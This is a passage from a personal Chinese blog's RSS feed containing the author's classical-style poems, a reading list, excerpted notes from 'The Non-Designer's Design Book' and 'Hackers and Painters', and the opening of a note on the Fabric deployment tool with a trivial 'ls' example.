&lt;h4&gt;其二&lt;/h4&gt;
&lt;p&gt;有雪天上来&lt;br /&gt;
何处梅花开。&lt;br /&gt;
卿说江南有，&lt;br /&gt;
能寄一枝来  &lt;/p&gt;
&lt;h4&gt;其三&lt;/h4&gt;
&lt;p&gt;有雪天上来，&lt;br /&gt;
人间染尘埃。&lt;br /&gt;
那时雪清澈，&lt;br /&gt;
送别的月台。  &lt;/p&gt;
&lt;h4&gt;其四&lt;/h4&gt;
&lt;p&gt;有雪天上来&lt;br /&gt;
轻舟欲访戴。&lt;br /&gt;
掩卷才记起，&lt;br /&gt;
魏晋已不再。  &lt;/p&gt;
&lt;h4&gt;其五&lt;/h4&gt;
&lt;p&gt;有雪天上来&lt;br /&gt;
喧嚣已不再。&lt;br /&gt;
时闻犬吠声，&lt;br /&gt;
人间如世外。  &lt;/p&gt;
&lt;h4&gt;其六&lt;/h4&gt;
&lt;p&gt;有雪天上来&lt;br /&gt;
有雪入梦来。&lt;br /&gt;
我自梦中醒，&lt;br /&gt;
此景梦之外？  &lt;/p&gt;
&lt;h3&gt;大沥溪几首&lt;/h3&gt;
&lt;p&gt;高二时，清明那天去的，风和日丽的天气  &lt;/p&gt;
&lt;h4&gt;其一&lt;/h4&gt;
&lt;p&gt;山下有田，清明时节，杂花遍野&lt;br /&gt;
入眼繁花闹，&lt;br /&gt;
幽香近可闻。&lt;br /&gt;
有人醉花海，（注）&lt;br /&gt;
我醉赏花人。&lt;br /&gt;
注：平仄仄 的变格 仄平仄&lt;/p&gt;
&lt;h4&gt;其二  题人过溪&lt;/h4&gt;
&lt;p&gt;山前有溪，隔断进山的路&lt;br /&gt;
涉水风中鬓斜，&lt;br /&gt;
回眸一笑无邪。&lt;br /&gt;
卿如浣纱于此，&lt;br /&gt;
我误清溪若耶。（注） 
注：若耶溪，传说为西施浣纱的地方&lt;/p&gt;
&lt;h4&gt;其三 谀人（平水韵）&lt;/h4&gt;
&lt;p&gt;春水何如春色深&lt;br /&gt;
秀于春色是何人&lt;br /&gt;
上游知汝正临水&lt;br /&gt;
捞得沉鱼四六分 （注）&lt;br /&gt;
注：用沉鱼落雁典&lt;/p&gt;
&lt;h4&gt;其四&lt;/h4&gt;
&lt;p&gt;我若此中小隐，&lt;br /&gt;
今生不种桃花。&lt;br /&gt;
恐教渔父相见，&lt;br /&gt;
引来人世喧哗。  &lt;/p&gt;
&lt;h4&gt;其五  后记（平水韵）&lt;/h4&gt;
&lt;p&gt;游客意如何？&lt;br /&gt;
乘风且踏歌。&lt;br /&gt;
山间俗气少，&lt;br /&gt;
向晚夕阳多。    &lt;/p&gt;
&lt;h4&gt;送人将近宿舍(古风)&lt;/h4&gt;
&lt;p&gt;今年雪多，傍晚才下的雪，已经淹没半只鞋&lt;br /&gt;
“此处吾将返，前路且徐行。”（我当然是用现代汉语说的^_^）&lt;br /&gt;
暮色深背影，落雪厚我肩。  &lt;/p&gt;
&lt;h4&gt;杂感&lt;/h4&gt;
&lt;p&gt;青春燃已烬，天际的流星。&lt;br /&gt;
孤僻逐年减？痴顽与日增。&lt;br /&gt;
往后只文艺，当时曾愤青。&lt;br /&gt;
沟渠明月照，梅雪俱冥冥。  &lt;/p&gt;
&lt;h4&gt;近况&lt;/h4&gt;
&lt;p&gt;终于考完试了~~  &lt;/p&gt;
&lt;p&gt;睡醒不知年月日，早餐并作午餐吃。&lt;br /&gt;
出门常陷空城计，上网时和险韵诗。
忙里尤能忘小我，闲来可惧是深思。&lt;br /&gt;
闻说大雪将来矣，却为莼鲈肯告辞    &lt;/p&gt;
&lt;h4&gt;元夕&lt;/h4&gt;
&lt;p&gt;有月云端似隔纱， 有约河畔等急吗？&lt;br /&gt;
我逆人潮亦往矣， 驻足只为看烟花。   &lt;/p&gt;
&lt;h4&gt;临江仙，寄人&lt;/h4&gt;
&lt;p&gt;昔日费心险韵，而今平仄生疏。少年兴致近来无。浮生多少事，一念竟成虚。&lt;br /&gt;
我惯生涯辗转，怜卿零落江湖。相逢可待是年初，烟花明灭里，夜雪满归途。  &lt;/p&gt;
&lt;h4&gt;喝火令 . 杂感&lt;/h4&gt;
&lt;p&gt;掩卷山河寂，朝花浴晚风。指尖年岁太匆匆。随兴漫游今古，隔纸与谁逢？&lt;br /&gt;
我亦飘零久悲欢略不同?也仍衣锦夜行中。过眼惊鸿，过眼百花空，过眼凉眸秋水，又近一年冬。  &lt;/p&gt;
&lt;h4&gt;电话(折腰体)&lt;/h4&gt;
&lt;p&gt;纸间沉溺久，节侯已秋凉,&lt;br /&gt;
家人电话里，催换厚衣裳。 &lt;/p&gt;
&lt;h4&gt;中秋 寄人&lt;/h4&gt;
&lt;p&gt;安处即桃源，能无车马喧。&lt;br /&gt;
堪寄生涯浅，得闻诸子渊。&lt;br /&gt;
此地人还好，他乡月也圆。&lt;br /&gt;
阶前生藻荇，清冽逊林泉？  &lt;/p&gt;
&lt;h4&gt;临江仙·山行&lt;/h4&gt;
&lt;p&gt;风起林中烟俱散，枝头浅绿鹅黄。一溪曲水可流觞。水声忽向左，鸟语变前方。&lt;br /&gt;
回首田间人渐渺，轻描小路三行。依稀犬吠自村庄。炊烟轻起处，细辨是吾乡  &lt;/p&gt;
&lt;h4&gt;水调歌头 校园夜色 （新韵）&lt;/h4&gt;
&lt;p&gt;小路曲折处，过客不经常。&lt;br /&gt;
依稀人影依偎，灯火略昏黄。&lt;br /&gt;
偶尔微云遮月，偶尔清风路过，青草味清香。&lt;br /&gt;
浅唱欠焦尾，细语话参商。  &lt;/p&gt;
&lt;p&gt;真耶幻？似梦里？“照银缸。”&lt;br /&gt;
凭栏临水，婵娟人影岂黄梁？&lt;br /&gt;
静影池中沉璧，素手轻抛石子，溅几点星光。&lt;br /&gt;
岔路望归矣，渐人影微茫。  &lt;/p&gt;
&lt;h4&gt;浣溪沙·单车闲逛的下午&lt;/h4&gt;
&lt;p&gt;出了校门拐个弯，&lt;br /&gt;
单车树影里悠然，&lt;br /&gt;
抬头天际宝石蓝。  &lt;/p&gt;
&lt;p&gt;久困书桌厌纸笔&lt;br /&gt;
难得琐事不纠缠，&lt;br /&gt;
歌声耳畔到云端。（注）&lt;br /&gt;
注：俺戴了耳机  &lt;/p&gt;
&lt;h4&gt;临江仙·给我的英语六级考试&lt;/h4&gt;
&lt;p&gt;英语课上看到qq空间里的一篇写六级的词，也跟着写了篇&lt;br /&gt;
手里依然旧笔，眼中到处新词，有些好像旧相识。卿名已不记，怪我不相思？&lt;br /&gt;
与汝相约灯下，窗前明月柳枝。念吾抱布与蚩蚩（注），今年六月里，待我莫矜持。&lt;br /&gt;
注:诗经“氓之蚩蚩，抱布贸丝”  &lt;/p&gt;
&lt;h4&gt;萤火虫&lt;/h4&gt;
&lt;p&gt;一诺初逢道后来，轻罗小扇染尘埃。
悬灯久待荒野里，不复书生踏雪来。&lt;br /&gt;
注：久待荒野意思来自张爱玲的名篇，在时间的荒野里，不早一步也。。 &lt;/p&gt;
&lt;h4&gt;木兰花慢·有寄&lt;/h4&gt;
&lt;p&gt;又一天傍晚，楼群里，落夕阳。&lt;br /&gt;
正人影长长，微风缓缓，归燕双双。&lt;br /&gt;
芬芳，草丛树上，有花开六月里飘香&lt;br /&gt;
人往人来路上，停留片刻何妨。  &lt;/p&gt;
&lt;p&gt;远方，此刻家乡，明月里，小池塘。&lt;br /&gt;
好景莫凭窗，趁花月好，还未打烊。&lt;br /&gt;
匆忙，可能一样？也曾奢望静止时光&lt;br /&gt;
也叹白驹过隙，也曾愿是黄梁？  &lt;/p&gt;
&lt;h4&gt;喝火令 次韵半了斑竹&lt;/h4&gt;
&lt;p&gt;笑靥难如昨，愁眉备考人。&lt;br /&gt;
去年题目太惊魂。&lt;br /&gt;
自习室中风景，身后绿罗裙。  &lt;/p&gt;
&lt;p&gt;下课时搁笔，偷瞄趁水浑。&lt;br /&gt;
转身一瞥应无痕。&lt;br /&gt;
转看书窗，转看月穿云，转看一街灯火，&lt;br /&gt;
摇曳着红尘  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 06 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-06:poem-2-year.html</guid><category>诗词</category></item><item><title>推荐书籍</title><link>/Book-interesting.html</link><description>&lt;p&gt;常有朋友说书近来荒，偏偏你总有好运能邂逅好书，于是让我推荐些。&lt;/p&gt;
&lt;p&gt;读的书不多，遇到的好书又不算少，一时想和盘托出，总无奈记性不好，于是翻箱倒柜，抓耳挠腮…&lt;/p&gt;
&lt;p&gt;索性花点时间整理一下自己的书单。把读过且喜欢的罗列一下，以飨知音。也方便自己将来想再读一遍时能找到。&lt;/p&gt;
&lt;p&gt;说来惭愧，大学以来才有阅读的习惯。所幸的是，每当困顿的时候总能及时冒出一些书籍救我于水火。&lt;/p&gt;
&lt;p&gt;妹子曾问过，你喜欢书多些还是我多些，这如同问我你喜欢香蕉多些还是西瓜多些，我真不知道答案。&lt;/p&gt;
&lt;p&gt;天之待我，可谓厚也。&lt;/p&gt;
&lt;p&gt;与大家分享。(不定时更新)&lt;/p&gt;
&lt;h3&gt;杂文?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;《苏子世说》&lt;/li&gt;
&lt;li&gt;《送你一颗子弹》&lt;/li&gt;
&lt;li&gt;《观念的水位》&lt;/li&gt;
&lt;li&gt;《 爱恨不如期》&lt;/li&gt;
&lt;li&gt;《火与冰》（余杰）&lt;/li&gt;
&lt;li&gt;《 李碧华作品集》&lt;/li&gt;
&lt;li&gt;《世相物语》&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;古文一些&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;《庄子》&lt;/li&gt;
&lt;li&gt;《世说新语》&lt;/li&gt;
&lt;li&gt;《历代寓言选》&lt;/li&gt;
&lt;li&gt;《 张岱散文选集》&lt;/li&gt;
&lt;li&gt;《浮生六记》&lt;/li&gt;
&lt;li&gt;《红楼梦》&lt;/li&gt;
&lt;li&gt;《小窗幽记》&lt;/li&gt;
&lt;li&gt;《幽梦影》&lt;/li&gt;
&lt;li&gt;《随园诗话》&lt;/li&gt;
&lt;li&gt;《闲情偶寄》&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;诗词类&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;《月出集》&lt;/li&gt;
&lt;li&gt;《千山集》&lt;/li&gt;
&lt;li&gt;《空花集》&lt;/li&gt;
&lt;li&gt;《掌珠集》&lt;/li&gt;
&lt;li&gt;《藏海集》&lt;/li&gt;
&lt;li&gt;《唐诗百话》（施蛰存）&lt;/li&gt;
&lt;li&gt;《杜甫诗选注》&lt;/li&gt;
&lt;li&gt;《诗词格律概要》（想学格律的朋友可以用它入门）&lt;/li&gt;
&lt;li&gt;《声律启蒙》（这本册子在论坛里大家都不屑于提到，说了有失身份的感觉。可对初学者熟悉语感和对仗还是挺好*  的。味浅而不能下酒，可以佐茶）&lt;/li&gt;
&lt;li&gt;《宋词三百首全解》（上彊邨民编 蔡义江解）&lt;/li&gt;
&lt;li&gt;《历代典故辞典》&lt;/li&gt;
&lt;li&gt;《诗词例话》&lt;/li&gt;
&lt;li&gt;《诗法举隅》&lt;/li&gt;
&lt;li&gt;《中国诗句法论》&lt;/li&gt;
&lt;li&gt;《诗境浅说》&lt;/li&gt;
&lt;li&gt;《此情无计可消除:漱玉词·断肠词》&lt;/li&gt;
&lt;li&gt;《关于方文山的素颜韵脚诗》&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;《写给大家看的设计书》&lt;/li&gt;
&lt;li&gt;《黑客与画家》&lt;/li&gt;
&lt;li&gt;《技术元素》&lt;/li&gt;
&lt;li&gt;《创客:新工业革命》&lt;/li&gt;
&lt;li&gt;《Linux/Unix设计思想 》&lt;/li&gt;
&lt;li&gt;《Learning Python》&lt;/li&gt;
&lt;li&gt;《Head first programming》&lt;/li&gt;
&lt;li&gt;《集体智慧编程》 &lt;/li&gt;
&lt;li&gt;《写给大家看得面向对象》&lt;/li&gt;
&lt;li&gt;《设计模式解析》&lt;/li&gt;
&lt;li&gt;《数字乌托邦》&lt;/li&gt;
&lt;li&gt;《Me 2.0》&lt;/li&gt;
&lt;li&gt;《jQuery in action》&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;小说&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;《孤独的像一颗星球》&lt;/li&gt;
&lt;li&gt;《天龙八部》&lt;/li&gt;
&lt;li&gt;《笑傲江湖》&lt;/li&gt;
&lt;li&gt;《神雕侠侣》&lt;/li&gt;
&lt;li&gt;《武林外史》&lt;/li&gt;
&lt;li&gt;《天涯明月刀》&lt;/li&gt;
&lt;li&gt;《诛仙》&lt;/li&gt;
&lt;li&gt;《三体》
《苏东坡传》&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;《热的解析理论》&lt;/li&gt;
&lt;li&gt;《大设计》&lt;/li&gt;
&lt;li&gt;《 数学的语言:化无形为可见》&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;《博弈游戏》（白波）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;《逻辑哲学论》（读懂的部分极少，略有理解处皆震撼）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;《愚人颂》&lt;/li&gt;
&lt;li&gt;《人生的智慧》（叔本华）&lt;/li&gt;
&lt;li&gt;《诗与哲学》&lt;/li&gt;
&lt;li&gt;《社会契约论》&lt;/li&gt;
&lt;li&gt;《思想录》&lt;/li&gt;
&lt;li&gt;《哲学的门槛》&lt;/li&gt;
&lt;li&gt;《西方哲学智慧》&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;《周国平散文精选》&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;《逍遥游》&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;《道可道》&lt;/li&gt;
&lt;li&gt;《 思辨的禅趣》&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 05 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-05:Book-interesting.html</guid><category>book</category></item><item><title>写给大家看的设计书</title><link>/The-Non-Designer's-Design-Book.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;***摘自Robin Williams 《写给大家看的设计书》&lt;a href="http://pan.baidu.com/share/link?shareid=1097678431&amp;amp;uk=621437724&amp;amp;fid=2226291531"&gt;下载地址&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt;&lt;/p&gt;
&lt;h4&gt;以下是读书时的摘记。&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们的前提很老套,还是那句格言:&lt;code&gt;知识就是力量&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;复杂的设计原理在这里被浓缩为 4 个词:&lt;code&gt;亲密性&lt;/code&gt;、&lt;code&gt;对齐&lt;/code&gt;、&lt;code&gt;重复&lt;/code&gt;和&lt;code&gt;对比&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;h4&gt;对比(Contrast)&lt;/h4&gt;
&lt;p&gt;对比的基本思想是,要避免页面上的元素太过相似。如果元素(字体、颜色、大小、线宽、形状、空间等)不相同,那就干脆让它们&lt;code&gt;截然不同&lt;/code&gt;。要让页面引人注目,对比通常是最重要的一个因素,正是它能使读者首先看这个页面。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;h4&gt;重复(Repetition)&lt;/h4&gt;
&lt;p&gt;让设计中的视觉要素在整个作品中重复出现。可以重复颜色、形状、材质、空间关系、线宽、字体、大小和图片,等等。这样一来,既能增加&lt;code&gt;条理性&lt;/code&gt;,还可以加强&lt;code&gt;统一性&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;h4&gt;对齐(Alignment)&lt;/h4&gt;
&lt;p&gt;任何东西都不能在页面上随意安放。每个元素都应当与页面上的另一个元素有某种&lt;code&gt;视觉联系&lt;/code&gt;。这样能建立一种清晰、精巧而且清爽的外观。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;h4&gt;亲密性(Proximity)&lt;/h4&gt;
&lt;p&gt;彼此相关的项应当&lt;code&gt;靠近&lt;/code&gt;,&lt;code&gt;归组&lt;/code&gt;在一起。如果多个项相互之间存在很近的亲密性,它们就会成为一个&lt;code&gt;视觉单元&lt;/code&gt;,而不是多个孤立的元素。这有助于组织信息,减少混乱,为读者提供清晰的结构。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;亲密性(第2章)&lt;/h3&gt;
&lt;p&gt;Robin&lt;code&gt;亲密性原则&lt;/code&gt;是指:将相关的项组织在一起,移动这些项,使它们的&lt;code&gt;物理位置相互靠近&lt;/code&gt;,这样一来,相关的项将被看作凝聚为一体的一个组,而不再是一堆彼此无关的片段。&lt;br /&gt;
在一个页面上,物理位置的接近就意味存在着关联&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;实例：
&lt;img alt="1" src="img/book-sjs-1.jpg" /&gt;
&lt;img alt="2" src="img/book-sjs-2.jpg" /&gt;
&lt;img alt="3" src="img/book-sjs-3.jpg" /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;亲密性小结&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;如果多个项相互之间存在很近的亲密性,它们将成为一个视觉单元,而不是多个孤立的元素。彼此相关的项应当归在一组&lt;/li&gt;
&lt;li&gt;&lt;code&gt;根本目的&lt;/code&gt;:亲密性的根本目的是实现组织性&lt;/li&gt;
&lt;li&gt;利用亲密性原则,还可以使空白(这是设计者们最喜欢的)更美观&lt;/li&gt;
&lt;li&gt;如何实现:看看哪些孤立的元素可以归在一组,使之成为一个视觉单元。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;第3章(对 齐)&lt;/h3&gt;
&lt;p&gt;Robin 对齐原则是指:“任何元素都不能在页面上随意安放。每一项都应当与页面上的某个内容存在某种视觉联系”&lt;/p&gt;
&lt;h3&gt;第4章(重 复)&lt;/h3&gt;
&lt;p&gt;Robin 重复原则指出,“设计的某些方面需要在整个作品中重复”。&lt;/p&gt;
&lt;h3&gt;第5章(对 比)&lt;/h3&gt;
&lt;p&gt;Robin 对比原则指出:全相同,就应当使之不同,而且应当是截然不同。”&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 05 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-05:The-Non-Designer's-Design-Book.html</guid><category>book</category></item><item><title>黑客与画家</title><link>/book-Hackers-and-Painters.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;***摘自Paul Graham《黑客与画家》&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;程序写出来是给人看的，附带能在机器上运行。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;守口如瓶”的真正缺点在于，你从此无法享受讨论带来的好处了。讨论一个观点会产生更多的观点，不讨论就什么观点也没有。所以，如果可能的话，你最好找一些信得过的知己，只与他们畅所欲言、无所不谈。这样不仅可以获得新观点，还可以用来选择朋友。能够一起谈论“异端邪说”并且不会因此气急败坏的人，就是你最应该认识的朋友。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你想要清晰地思考，就必须远离人群。但是走得越远，你的处境就会越困难，受到的阻力也会越大，因为你没有迎合社会习俗，而是一步步地与它背道而驰。小时候，每个人都会鼓励你不断成长，变成一个心智成熟、不再耍小孩子脾气的人。但是，很少有人鼓励你继续成长，变成一个怀疑和抵制社会错误潮流的人。 
　　 　　如果自己就是潮水的一部分，怎么能看见潮流的方向呢？你只能永远保持质疑。问自己，什么话是我不能说的？为什么？ &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;书呆子不受欢迎的真正原因，是他们脑子里想着别的事情。他们的注意力都放在读书或者观察世界上面，而不是放在穿衣打扮、开晚会上面。他们就像头顶一杯水来踢足球，一边踢球，一边拼命保持不让水洒出来。其他人都在一门心思玩足球，遇到这样的对手，自然能够毫不费力地击败，并且心里还奇怪，对方怎么如此无能。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;惹怒他人的言论是那些可能会有人相信的言论。我猜想，最令人暴跳如雷的言论，就是被认为说出了真相的言论。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;真实世界的特点是，它极其庞大。如果总体足够大，即使是人数最少的少数派，只要聚集在一起，也能产生可观的力量。在真实世界中，书呆子在某些地方聚集起来，形成自己的社区，智力因素成为那里最被看重的东西。有时，这种因素甚至会以相反的形式表现出来，特别是在大学的数理学系，书呆子甚至会夸大笨拙，以显示自己的聪明。约翰•纳什非常钦佩诺伯特•维纳就学维纳的样子，经过走廊的时候都用手扶着墙走路。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于书呆子来说，意识到学校并非全部的人生，也是很重要的事情。学校是一个很奇怪的、人为设计出来的体系，一半像是无菌室，一半像是野蛮洪荒之地。它就像人生一样，里面无所不包，但又不是事物的真实样子。它只是一个暂时的过程，只要你向前看，你就能超越它，哪怕现在你还是身处其中。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是，像所有人一样，成年人不喜欢揪住不放这种令人不快的事实。你不去埋头探寻，就不会发现具体的证据，就会永远以为这件事是抽象的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们的疯狂源于到处都是一片可怕的无聊。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;创造优美事物的方式往往不是从头做起，而是在现有成果的基础上做一些小小的调整，或者将已有的观点用比较新的方式组合起来。这种类型的工作很难用研究性的论文表达。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;黑客搞懂“计算理论”（theory of computation）的必要性，与画家搞懂颜料化学成分的必要性差不多大。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“你的电脑”这个概念正慢慢成为过去时，取而代之的是“你的数据”。你应该可以从任何电脑上获取你的数据。或者更准确地说，在任何终端设备上获取你的数据，终端设备不一定是电脑。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;黑客如何才能做自己喜欢的事情？我认为这个问题的解决方法是一个几乎所有创作者都知道的方法：找一份养家糊口的“白天工作”（day job）。这个词是从音乐家身上来的，他们晚上表演音乐，所以白天可以找一份其他工作。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;因为如果你不爱一件事，你不可能把它做得真正优秀，要是你很热爱编程，你就不可避免地会开发你自己的项目。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有一件事情是可以借鉴的（至少可以确认），那就是应该如何学习编程。画家学习绘画的方法主要是动手去画，黑客学习编程的方法也理应如此。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史的常态似乎就是，任何一个年代的人们，都会对一些荒谬的东西深信不疑。他们的信念还很坚定，只要有人稍微表示一点怀疑，就会惹来大麻烦。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不管是哪一个原因，看来存在一个很清晰的关联关系：智力越高的人，越愿意去思考那些惊世骇俗的思想观点。这不仅仅因为聪明人本身很积极地寻找传统观念的漏洞，还因为传统观念对他们的束缚力很小，很容易摆脱。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;训练自己去想那些不能想的事情，你获得的好处会超过所得到的想法本身。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;通过创造有价值的东西而致富，这种方法的优势不仅仅在于它是合法的（许多其他方法如今都是不合法的），还在于它更简单。你只需要做出别人需要的东西就可以了。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;要致富，你需要两样东西：可测量性和可放大性。你的职位产生的业绩，应该是可测量的，否则你做得再多，也不会得到更多的报酬。此外，你还必须有可放大性，也就是说你做出的决定能够产生巨大的效应。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;什么是技术？技术就是某种手段，就是我们做事的方式。如果你发现了一种做事的新方式，它的经济价值就取决于有多少人使用这种新方式。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你必须时刻牢记的最基本的原则就是，创造人们需要的东西，也就是创造财富。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 05 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-05:book-Hackers-and-Painters.html</guid><category>book</category></item><item><title>fabric备忘</title><link>/learning%20fabric.html</link><description>&lt;p&gt;系统部署环境是一件很乏味的工作，系统管理也是，fabric让这一切更加自动化，何乐而不为呢，于是决定学好这个工具。&lt;/p&gt;
&lt;h3&gt;What is it?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Simple, Pythonic remote execution and deployment.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;fabric具体都干些啥&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;通过SSH在多个host上批量执行任务&lt;/li&gt;
&lt;li&gt;自动化部署，或者执行系统管理任务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;学习使用&lt;/h3&gt;
&lt;p&gt;首先当然是去阅读&lt;a href="http://docs.fabfile.org/en/1.8/"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fabric.api&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;local&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;lslocal&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ls&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;在django里用&lt;/h3&gt;
